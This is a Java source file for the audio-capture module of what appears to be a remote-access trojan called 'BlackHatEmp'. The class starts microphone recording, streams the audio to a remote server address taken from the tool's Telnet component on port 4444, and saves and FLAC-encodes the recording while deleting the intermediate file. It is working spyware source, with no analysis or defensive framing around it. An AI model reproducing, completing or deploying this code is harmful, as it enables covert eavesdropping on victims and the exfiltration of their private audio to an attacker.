/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import javaFlacEncoder.FLAC_FileEncoder;
import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioSystem;
import tooles.CreateTempFile;

/**
 *
 * @author abaza
 */
public class audio_implimantation {

    public MicAudioSystem.Audio AudioThread = null;
    public File AudioFile;
    String ServerFile = null;
    private CreateTempFile Tempf = null;

    public Boolean Status(boolean SwitchKey) {
        Tempf = new CreateTempFile();
        if (SwitchKey) {
            return StartRecord();
        } else {
            String Path = StopRecord();
            return Path.isEmpty();
        }
    }

    private boolean StartRecord() {
        if (blackhatemp.BlackHatEmp.Debug) {
            System.err.println("Record Start");
        }
        if (AudioThread == null) {
            try {
                AudioThread = new MicAudioSystem.Audio();
                AudioThread.init(0, blackhatemp.Telnet.ServerIP, 4444);
                AudioThread.start();
                AudioFile = Tempf.createTempDir(1, 4);
                return true;
            } catch (FileNotFoundException ex) {
                if (blackhatemp.BlackHatEmp.Debug) {
                    System.err.println("");
                }
            }
        }
        return false;
    }

    private String StopRecord() {
        if (blackhatemp.BlackHatEmp.Debug) {
            System.err.println("Record Stop");
        }
        if (AudioThread != null) {
            AudioThread.stop();
            try {
                Thread.sleep(500);
            } catch (InterruptedException ex) {
            }
            String FinalFile = saveToFile(AudioFile.getAbsolutePath().trim(), AudioFileFormat.Type.WAVE);

            if (FinalFile == null) {
                AudioThread = null;
                return null;
            }

            if (!FinalFile.isEmpty()) {
                AudioThread = null;
                return FinalFile;
            } else {
                if (blackhatemp.BlackHatEmp.Debug) {
                    System.err.println("Can't Save Audio File Audio Implimantation");
                }
                AudioThread = null;
                return null;
            }
        }
        return null;
    }

    private String saveToFile(String Name, AudioFileFormat.Type fileType) {
        if (blackhatemp.BlackHatEmp.Debug) {
            System.err.println("Write Record");
        }
        File target = new File(Name);

        if (AudioThread.audioInputStream == null) {
            if (blackhatemp.BlackHatEmp.Debug) {
                System.err.println("No loaded audio to save");
            }
            return null;
        }
        try {
            if (AudioSystem.write(AudioThread.audioInputStream, fileType, target) == -1) {
                throw new IOException("Problems writing to file");
            }
        } catch (Exception ex) {
            if (blackhatemp.BlackHatEmp.Debug) {
                System.err.println(ex.toString());
            }
            return null;
        }
        try {
            AudioThread.audioInputStream.reset();
            FLAC_FileEncoder flacEncoder = new FLAC_FileEncoder();
            File inputFile = new File(target.getAbsolutePath());
            File outputFile = new File(target.getName() + ".flac");

            flacEncoder.encode(inputFile, outputFile);
            inputFile.delete();
            return outputFile.getAbsolutePath();
        } catch (Exception e) {
            if (blackhatemp.BlackHatEmp.Debug) {
                System.err.println("Unable to reset stream " + e);
            }

            return null;
        }

    }
}
